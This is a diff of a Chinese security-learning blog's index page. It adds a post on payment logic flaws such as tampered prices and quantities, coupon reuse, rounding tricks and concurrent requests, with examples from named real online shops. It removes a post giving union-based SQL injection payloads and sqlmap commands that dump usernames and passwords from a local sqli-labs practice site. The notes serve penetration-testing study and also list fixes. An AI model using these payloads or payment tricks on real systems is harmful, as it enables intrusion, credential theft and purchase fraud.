@@ -262,6 +262,68 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-CDN介绍及绕过,支付逻辑漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/01/08/CDN%E4%BB%8B%E7%BB%8D%E5%8F%8A%E7%BB%95%E8%BF%87,%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="article-date">
+      <time datetime="2024-01-08T06:19:59.000Z" itemprop="datePublished">2024-01-08</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/08/CDN%E4%BB%8B%E7%BB%8D%E5%8F%8A%E7%BB%95%E8%BF%87,%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">CDN介绍及绕过,支付逻辑漏洞</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="CDN介绍及绕过"><a href="#CDN介绍及绕过" class="headerlink" title="CDN介绍及绕过"></a>CDN介绍及绕过</h2><h2 id="支付逻辑漏洞"><a href="#支付逻辑漏洞" class="headerlink" title="支付逻辑漏洞"></a>支付逻辑漏洞</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p>支付逻辑漏洞是指系统的支付流程中存在业务逻辑层面的漏洞,支付漏洞是 高风险漏洞 也属于 逻辑漏洞，通常是通过 篡改价格、数量、状态、接口、用户名等传参，从而造成 小钱够买大物 甚至可能造成 0元购买商品 等等，凡是 涉及购买、资金等方面的功能处 就有可能存在支付漏洞。</p>
+<h3 id="支付流程"><a href="#支付流程" class="headerlink" title="支付流程"></a>支付流程</h3><p>选择商品和数量——选择支付及配送方式——生成订单编号——订单支付选择——完成支付。如：最常见的支付逻辑漏洞通常是由于服务器端没有对客户端请求数据中的金额、数量等敏感信息进行效验导致。一般漏洞产生在电子商务类应用中,这里是以贝锐的商城进行举例的。</p>
+<h3 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h3><p>支付过程中可以修改支付金额2.可以将订单中的商品数量修改为负值。3.请求重放导致4.其他问题（程序异常，其他参数修改导致问题等）其他支付问题补充：修改支付状态、修改附属值（优惠券积分等）、修改支付接口、替换多个订单、重复支付等。5.发票越权,并发,也可能也能修改金额。</p>
+<h3 id="测试方法与修复方法"><a href="#测试方法与修复方法" class="headerlink" title="测试方法与修复方法"></a>测试方法与修复方法</h3><p>支付逻辑漏洞之修改订单数量：1、登录网站，选择购买一个商品并抓取数据包。2、找到其中代表商品数量的参数，将参数的值修改为负数,或者修改商品的pid。3、发送数据包，生成订单，观察订单是否有效，是否能进入支付页面。4、完成支付。可以从这4个方面的每一步单独入手验证是否存在漏洞。<br>举例<br>（1）登录贝锐的商城发现以下7个漏洞:<br>实现零元购:1.参数包里面没有价格，或者价格跟商品id校验，导致无法修复商品金额。2.掩藏商品的模糊测试，商品id，换参数包直接改。出现第1个的原因主要是商品下单的处导致。出现第2个的原因主要是商品购买处导致。3.购物单未校验加入零元购商品。第3个主要是支付宝接口和商品接口未校验导致商品任意购买。6.商品数量校验导致零元购。7.附带商品导致支付漏洞主要是在免费的商品或者增送的商品上做文章,可能通过修改它们的数量从而产生漏洞。<br>（2）通过支付宝和微信的校验缺点对某一个文库进行充值:<br>8.四舍五入导致支付漏洞 系统支付和微信的支付校验导致(提现) 0.009可以变成0.01<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704640221637-bfc70f6e-65c5-4090-82fb-35aaf1ae8c73.png">进行充值界面的抓包,将0.01改成0.009。<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704640696403-c9483fec-f582-450f-8765-1b58d170c062.png"><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704640760997-274cc9ef-ed41-4919-8ba1-135b349e0950.png"><br>这里微信和支付宝对支付的金额进行了校验,但是只到了小数点的第二位,如果出现第三位会采用四舍五入的方法强行进行校验。</p>
+<h2 id="芒果书城的漏洞"><a href="#芒果书城的漏洞" class="headerlink" title="芒果书城的漏洞"></a>芒果书城的漏洞</h2><p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704641149279-e165b9c6-d7f9-48ff-8bdc-50f144009779.png">存在一个修改数量价格就会变化的漏洞,被修复了,还存在一个修改书籍数量就能绕过的一个漏洞,被修复了。4.贝锐微商城:使用过红包的订单，有一个支付宝的订单号，有效期是15分钟，商家对接支付宝，取消订单，红包返回，无限使用</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704641741683-3ff6400a-0709-4192-9c9b-881862df21ee.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40666686/1704641782637-7fabdffc-e2db-4a2f-8979-4939827b59e4.png#averageHue=%23f4f3f3&clientId=u75bf778e-08fd-4&from=paste&height=110&id=u335fe28a&originHeight=137&originWidth=1212&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60803&status=done&style=none&taskId=uff3ab498-81fe-476f-a9d2-f796e7a6183&title=&width=969.6#averageHue=%23f4f3f3&from=url&id=RAFv3&originHeight=137&originWidth=1212&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704641887661-cf1cf51d-ed47-4b47-9ccb-85c30965a8b6.png"><br>并发需要用到插件,并发之后看长度。并发漏洞(服务器对功能点的多线程处理)：优惠劵，微薄的点赞，关注，取消点赞 优惠商品下单 所有的都能并发。修复方法：1.在请求数据中对对涉及金额、数量等敏感信息进行加密，保证加密算法不可猜解。并在服务器端对其进行校验。2.支付交易请求数据中加入tbken，防止重放攻击。3.支付系统需要实施严格的安全措施，例如验证支付请求的合法性、限制重复支付、验证用户身份、使用加密技术保护数据传输等。此外，定期进行安全审计和漏洞扫描，及时修复发现的漏洞也是重要的措施。4.对于用户而言，保护个人账户安全、使用安全的支付平台、谨慎处理退款请求等也是重要的预防措施。</p>
+<h2 id="Fiddler的使用"><a href="#Fiddler的使用" class="headerlink" title="Fiddler的使用"></a>Fiddler的使用</h2><p>下载流程:<a target="_blank" rel="noopener" href="https://blog.csdn.net/Mubei1314/article/details/122389950">https://blog.csdn.net/Mubei1314/article/details/122389950</a>Fiddler抓包联动burp进行数据分析:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU2NDM2OTQxMw==&mid=2247484054&idx=1&sn=3440b36b071491a9b7a03e1e293aab57&chksm=fc4d43fccb3acaea94fd6073cba7f68efad9ba21177694ec7599d99cb7330ffa7edf01f80002&scene=27">https://mp.weixin.qq.com/s?__biz&#x3D;MzU2NDM2OTQxMw&#x3D;&#x3D;&amp;mid&#x3D;2247484054&amp;idx&#x3D;1&amp;sn&#x3D;3440b36b071491a9b7a03e1e293aab57&amp;chksm&#x3D;fc4d43fccb3acaea94fd6073cba7f68efad9ba21177694ec7599d99cb7330ffa7edf01f80002&amp;scene&#x3D;27</a>使用过程中不要关代理。<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704642646670-70960ba8-e6c3-430c-9b0c-53b1fd0ac675.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-教育SRC分析,弱口令漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1086,72 +1148,6 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r <span class="string">&quot;../1.txt&quot;</span>  --dbs --batch</span><br><span class="line">增加等级与风险：  python sqlmap.py -r <span class="string">&quot;../1.txt&quot;</span>  --dbs --batch --level=<span class="number">5</span> --risk=<span class="number">3</span></span><br></pre></td></tr></table></figure>
 
 <p>此时爆出数据库。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703348000344-f1b633df-d235-48ea-aa19-c5b37be8ef63.png" alt="image.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-SQL注入之联合型" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/12/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E5%9E%8B/" class="article-date">
-      <time datetime="2023-12-23T14:35:16.000Z" itemprop="datePublished">2023-12-23</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E5%9E%8B/">SQL注入之联合型</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="安装PHP5-5-9，HackBar"><a href="#安装PHP5-5-9，HackBar" class="headerlink" title="安装PHP5.5.9，HackBar"></a>安装PHP5.5.9，HackBar</h2><p>1.打开虚拟机win10hei的PHPstudy，启动Apache和Mtsql，在软件管理的php界面下载php5.5.9，<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080258406-5071209f-9911-44bc-92f1-a2ae9d2f78ae.png" alt="image.png"><br>2.在下图的路径输入cmd,在输入以下命令：</p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080376428-d760af2c-e3e8-4399-b3cc-c4642397f8df.png" alt="image.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql  -u root -p</span><br><span class="line">show databases；</span><br><span class="line">use security;</span><br><span class="line">show tables;</span><br><span class="line">select 1，2,3;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080560321-32f26f0e-eb22-4eeb-92c0-9eb1a542ffb0.png" alt="Image.png"><br>3.下载火狐插件HackBar 它可以发包。把这个插件安装到浏览器。按键盘上的F12可以唤起它。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080753625-31554e52-90d8-4f13-b926-3d65803c9cff.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080802345-7bdec522-fae3-4bc3-a3c7-47975aa00522.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080911381-9f3e0491-4687-4014-9a3e-7ff1e1eb5b26.png" alt="image.png"><br>4.information_schema是在mysql5.0之后产生的（面试题考点）</p>
-<h2 id="SQL联合注入步骤"><a href="#SQL联合注入步骤" class="headerlink" title="SQL联合注入步骤"></a>SQL联合注入步骤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">联合(union)的顺序:查表-&gt;查字段名-&gt;查字段</span><br><span class="line"></span><br><span class="line">SQL查表</span><br><span class="line">select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database();-- -</span><br><span class="line"></span><br><span class="line">SQL查字段名</span><br><span class="line">select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();-- -</span><br><span class="line"></span><br><span class="line">SQL查字段</span><br><span class="line">select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;-- -     //这三条语句必记</span><br></pre></td></tr></table></figure>
-
-<p>1.把sqli文件复制到phpstudy的根目录下，使用php5.5.9，打开网站，点击sqli，进入第一关<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703081834980-d182d068-33e3-4409-a6a4-66d6b1d7520b.png" alt="image.png"><br>2.格式：本地地址或虚拟机地址&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;x   union      xxxxxxxxxxxxxxxx    – -<br>注意：x的值为-1或0         – -为SQL的注释<br>3.先判断是否闭合，输入？id&#x3D;1  再点击Excute发包。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703082782269-f4f9e588-7de0-4728-8678-0edc126360bd.png" alt="image.png"><br>4.然后在1后面加 ‘ 发现报错，如图，有5个分号，1和5抵消，2和3抵消，剩下4，说明没有闭合，1’就是我们要找的。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703083424177-f813c2f6-07c8-4ed9-8aa3-eb163abd70ff.png" alt="image.png"><br>5.其次，开始查表，把1改成0，在0’后面加一个空格，然后加union ，在union后面加查表语句  select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database();  这条语句后要加 – -   将后面的内容注释掉。<br>最终语句为<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database();-- -</code></p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703084084617-c5a5e408-80ed-4633-8657-172464224c47.png" alt="image.png"><br>6.查字段名，把原来语句的基础上，把查表语句改成查字段语句，然后加上– -<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#39;users&#39; and table_schema=database();-- -</code></p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703084568983-25426fef-0ad4-4668-92fe-01c31deb7031.png" alt="image.png"><br>7.最后查字段，把原来语句的基础上，把查字段名语句改成查字段语句，在 group_concat(id,”<del>“,username,”</del>“,password)的group前加上     1，      在password）后面加    ,3       最后再完整语句后加上– -<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1, group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3 from users ;-- -</code></p>
-<p>8.最终得到我们想要的整列的username和整列的password<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703085525578-5bf71d67-d324-4a38-bec1-a63cdfd5bcc0.png" alt="Image.png"></p>
 
       
     </div>
